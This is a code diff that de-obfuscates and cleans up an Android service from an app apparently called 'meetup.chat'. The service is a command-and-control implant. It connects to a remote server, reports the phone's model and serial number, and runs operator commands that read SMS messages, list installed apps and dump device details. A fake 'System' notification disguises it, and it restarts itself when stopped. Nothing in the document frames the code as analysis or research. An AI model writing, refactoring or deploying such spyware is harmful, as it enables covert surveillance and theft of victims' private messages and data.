@@ -13,42 +13,41 @@ import java.io.*;
 import java.net.Socket;
 
 public class d extends Service {
-    private static final String a = "C2Channel";
-    private static final int b = 1;
-    private Socket c;
-    private PrintWriter d;
-    private BufferedReader e;
-    private volatile boolean f = true;
-    private String g;
+    private static final String CHANNEL_ID = "C2Channel";
+    private static final int NOTIF_ID = 1;
+    private Socket socket;
+    private PrintWriter writer;
+    private BufferedReader reader;
+    private volatile boolean running = true;
+    private String deviceId;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        a();
-        g = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
+        createNotificationChannel();
+        deviceId = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
     }
 
     @Override
-    public int onStartCommand(Intent i, int j, int k) {
-        startForeground(b, b());
-        new Thread(this::c).start();
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        startForeground(NOTIF_ID, createNotification());
+        new Thread(this::connectAndServe).start();
         return START_STICKY;
     }
 
-    private void c() {
-        while (f) {
+    private void connectAndServe() {
+        while (running) {
             try {
-                // Fix: Use com.meetup.chat.c for config
-                c = new Socket(com.meetup.chat.c.a, com.meetup.chat.c.b);
-                d = new PrintWriter(c.getOutputStream(), true);
-                e = new BufferedReader(new InputStreamReader(c.getInputStream()));
-                d.println("DEVICE:" + g);
-                d.println("READY");
-                String h;
-                while ((h = e.readLine()) != null && f) {
-                    String resp = d(h);
-                    d.println(resp);
-                    d.println("---END---");
+                socket = new Socket(c.a, c.b);
+                writer = new PrintWriter(socket.getOutputStream(), true);
+                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                writer.println("DEVICE:" + deviceId);
+                writer.println("READY");
+                String command;
+                while ((command = reader.readLine()) != null && running) {
+                    String response = executeCommand(command);
+                    writer.println(response);
+                    writer.println("---END---");
                 }
             } catch (Exception ex) {
                 try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
@@ -56,40 +55,40 @@ public class d extends Service {
         }
     }
 
-    private String d(String h) {
-        if (h.startsWith("@")) {
-            String[] parts = h.split(":", 2);
+    private String executeCommand(String command) {
+        if (command.startsWith("@")) {
+            String[] parts = command.split(":", 2);
             if (parts.length < 2) return "Invalid target";
             String target = parts[0].substring(1);
             String cmd = parts[1];
-            if (target.equals("all") || target.equals(g) || target.equals(Build.MODEL)) {
+            if (target.equals("all") || target.equals(deviceId) || target.equals(Build.MODEL)) {
                 return executeCmd(cmd);
             }
             return "Ignored";
         }
-        return executeCmd(h);
+        return executeCmd(command);
     }
 
     private String executeCmd(String cmd) {
         if (cmd.equalsIgnoreCase("ping")) return "PONG";
-        if (cmd.equalsIgnoreCase("info")) return com.meetup.chat.f.a(this);
-        if (cmd.equalsIgnoreCase("sms read")) return com.meetup.chat.f.b(this);
-        if (cmd.equalsIgnoreCase("apps list")) return com.meetup.chat.f.c(this);
-        if (cmd.equalsIgnoreCase("device")) return g;
-        if (cmd.equalsIgnoreCase("exit")) { f = false; stopSelf(); return "EXIT"; }
+        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getInfo(this);
+        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
+        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getApps(this);
+        if (cmd.equalsIgnoreCase("device")) return deviceId;
+        if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }
         return "Unknown command";
     }
 
-    private void a() {
+    private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(a, "C2 Service", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            if (nm != null) nm.createNotificationChannel(ch);
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "C2 Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            if (manager != null) manager.createNotificationChannel(channel);
         }
     }
 
-    private Notification b() {
-        return new NotificationCompat.Builder(this, a)
+    private Notification createNotification() {
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("System")
                 .setContentText("Running...")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details)
@@ -100,11 +99,11 @@ public class d extends Service {
 
     @Override
     public void onDestroy() {
-        f = false;
-        try { c.close(); } catch (Exception ignored) {}
+        running = false;
+        try { socket.close(); } catch (Exception ignored) {}
         super.onDestroy();
     }
 
     @Override
-    public IBinder onBind(Intent i) { return null; }
+    public IBinder onBind(Intent intent) { return null; }
 }
